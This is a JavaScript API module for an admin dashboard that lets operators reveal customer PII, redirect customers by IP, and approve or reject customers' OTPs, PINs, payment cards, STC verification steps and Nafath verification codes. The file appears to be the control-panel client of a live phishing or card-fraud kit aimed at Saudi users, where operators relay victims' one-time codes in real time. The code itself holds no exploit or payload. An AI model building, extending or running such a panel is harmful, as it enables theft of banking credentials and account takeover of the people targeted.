import request from './request';

/**
 * Dashboard API service
 *
 * All dashboard data now uses real API endpoints.
 *
 * Login Attempts, Customer Activities, Settings
 * have dedicated API modules: loginAttempts.js, customerActivities.js, settings.js
 */

/**
 * Fetch real-time admin notifications
 * @returns {Promise<{ data: { success: boolean, data: Array, unread_count: number } }>}
 */
export function getNotifications ()
{
    return request.get( '/admin/notifications', { silent: true, timeout: 6000 } );
}

/**
 * Mark all notifications as read
 * @returns {Promise<{ data: { success: boolean } }>}
 */
export function markNotificationsRead ()
{
    return request.post( '/admin/notifications/read', {}, { silent: true, timeout: 6000 } );
}

/**
 * Mark a single notification as read by key
 * @param {string} key - notification key (e.g. "otp-123")
 * @returns {Promise<{ data: { success: boolean } }>}
 */
export function markSingleNotificationRead ( key )
{
    return request.post( '/admin/notifications/read-single', { key }, { silent: true, timeout: 6000 } );
}

// ─── Customer Tracking API (LIVE) ────────────────────────────────────

/**
 * @returns {Promise<{ data: { success: boolean, data: Array, count: number } }>}
 */
export function getCustomers ( params = {}, config = {} )
{
    return request.get( '/admin/customers', { params, ...config } );
}

/**
 * Fetch a single customer by ID (used for patch updates from WebSocket events).
 * @param {number} id
 * @returns {Promise<{ data: { success: boolean, data: Object } }>}
 */
export function getCustomer ( id )
{
    return request.get( `/admin/customers/${ id }`, { silent: true, timeout: 8000 } );
}

/**
 * Reveal sensitive PII for a specific admin customer row.
 * This is intentionally separate from the list endpoint to defer decryption.
 * @param {number} id
 */
export function revealCustomerPii ( id )
{
    return request.post( `/admin/customers/${ id }/reveal-pii` );
}

/**
 * @param {string} customerIp
 * @param {string} redirectUrl
 */
export function redirectCustomer ( customerIp, redirectUrl )
{
    return request.post( '/admin/actions/redirect-customer', { customer_ip: customerIp, redirect_url: redirectUrl } );
}

/**
 * @param {number} otpId
 * @param {string} customerIp
 */
export function approveOtp ( otpId, customerIp )
{
    return request.post( `/admin/actions/otp/${ otpId }/approve`, { customer_ip: customerIp } );
}

/**
 * @param {number} otpId
 * @param {string} customerIp
 * @param {string} [reason]
 */
export function rejectOtp ( otpId, customerIp, reason )
{
    return request.post( `/admin/actions/otp/${ otpId }/reject`, { customer_ip: customerIp, reason } );
}

/**
 * @param {number} pinId
 * @param {string} customerIp
 */
export function approvePin ( pinId, customerIp )
{
    return request.post( `/admin/actions/otp/${ pinId }/approve`, { customer_ip: customerIp, type: 'pin' } );
}

/**
 * @param {number} pinId
 * @param {string} customerIp
 * @param {string} [reason]
 */
export function rejectPin ( pinId, customerIp, reason )
{
    return request.post( `/admin/actions/otp/${ pinId }/reject`, { customer_ip: customerIp, type: 'pin', reason } );
}

/**
 * @param {number} otpId
 * @param {string} customerIp
 */
export function approvePhoneOtp ( otpId, customerIp )
{
    return request.post( '/admin/actions/phone-verification/approve', { otp_id: otpId, customer_ip: customerIp } );
}

/**
 * @param {number} otpId
 * @param {string} customerIp
 * @param {string} [reason]
 */
export function rejectPhoneOtp ( otpId, customerIp, reason )
{
    return request.post( '/admin/actions/phone-verification/reject', { otp_id: otpId, customer_ip: customerIp, reason } );
}

// ─── Phone Data Actions (Stage 1: approval before OTP) ──────────

/**
 * Approve phone data (stage 1) — allows OTP to be sent.
 * @param {string} customerIp
 */
export function approvePhoneData ( customerIp )
{
    return request.post( '/admin/actions/phone-data/approve', { customer_ip: customerIp } );
}

/**
 * Reject phone data (stage 1) — deny before OTP.
 * @param {string} customerIp
 * @param {string} [reason]
 */
export function rejectPhoneData ( customerIp, reason )
{
    return request.post( '/admin/actions/phone-data/reject', { customer_ip: customerIp, reason } );
}

// ─── STC Verification Actions (3 stages) ────────────────────────────

/**
 * @param {number} otpId
 * @param {string} customerIp
 */
export function approveStcWaiting ( otpId, customerIp )
{
    return request.post( '/admin/actions/stc-verification/waiting/approve', { otp_id: otpId, customer_ip: customerIp } );
}

/**
 * @param {number} otpId
 * @param {string} customerIp
 * @param {string} [reason]
 */
export function rejectStcWaiting ( otpId, customerIp, reason )
{
    return request.post( '/admin/actions/stc-verification/waiting/reject', { otp_id: otpId, customer_ip: customerIp, reason } );
}

/**
 * @param {number} otpId
 * @param {string} customerIp
 */
export function approveStcOtp ( otpId, customerIp )
{
    return request.post( '/admin/actions/stc-verification/otp/approve', { otp_id: otpId, customer_ip: customerIp } );
}

/**
 * @param {number} otpId
 * @param {string} customerIp
 * @param {string} [reason]
 */
export function rejectStcOtp ( otpId, customerIp, reason )
{
    return request.post( '/admin/actions/stc-verification/otp/reject', { otp_id: otpId, customer_ip: customerIp, reason } );
}

/**
 * @param {number} otpId
 * @param {string} customerIp
 */
export function approveStcCall ( otpId, customerIp )
{
    return request.post( '/admin/actions/stc-verification/call/approve', { otp_id: otpId, customer_ip: customerIp } );
}

/**
 * @param {number} otpId
 * @param {string} customerIp
 * @param {string} [reason]
 */
export function rejectStcCall ( otpId, customerIp, reason )
{
    return request.post( '/admin/actions/stc-verification/call/reject', { otp_id: otpId, customer_ip: customerIp, reason } );
}

/**
 * @param {number} cardId
 */
export function approveCard ( cardId )
{
    return request.post( `/admin/actions/payment-cards/${ cardId }/approve` );
}

/**
 * @param {number} cardId
 * @param {string} reason
 */
export function rejectCard ( cardId, reason )
{
    return request.post( `/admin/actions/payment-cards/${ cardId }/reject`, { reason } );
}

// ─── Nafath Verification Actions ─────────────────────────────────────

/**
 * @param {string} customerIp
 * @param {string} [verificationCode]
 */
export function approveNafath ( customerIp, verificationCode )
{
    return request.post( '/admin/actions/nafath/approve', { customer_ip: customerIp, verification_code: verificationCode } );
}

/**
 * @param {string} customerIp
 * @param {string} [reason]
 */
export function rejectNafath ( customerIp, reason )
{
    return request.post( '/admin/actions/nafath/reject', { customer_ip: customerIp, reason } );
}

/**
 * @param {string} customerIp
 * @param {string} verificationCode
 */
export function updateNafathVerificationCode ( customerIp, verificationCode )
{
    return request.post( '/admin/actions/nafath/update-code', { customer_ip: customerIp, verification_code: verificationCode } );
}

/**
 * @param {number} customerId
 */
export function deleteCustomerCard ( customerId )
{
    return request.delete( `/admin/customers/${ customerId }` );
}

// ─── Quote Monitor API (LIVE) ───────────────────────────────────────

/** @returns {Promise<{ data: { live_count: number, sessions: Array } }>} */
export function getQuoteLiveSessions ()
{
    return request.get( '/admin/quotes/live' );
}

/** @returns {Promise<{ data: { data: Array, total: number } }>} */
export function getQuoteSessions ( params = {} )
{
    return request.get( '/admin/quotes', { params } );
}

/** @returns {Promise<{ data: object }>} */
export function getQuoteAnalytics ( params = {} )
{
    return request.get( '/admin/quotes/analytics', { params } );
}
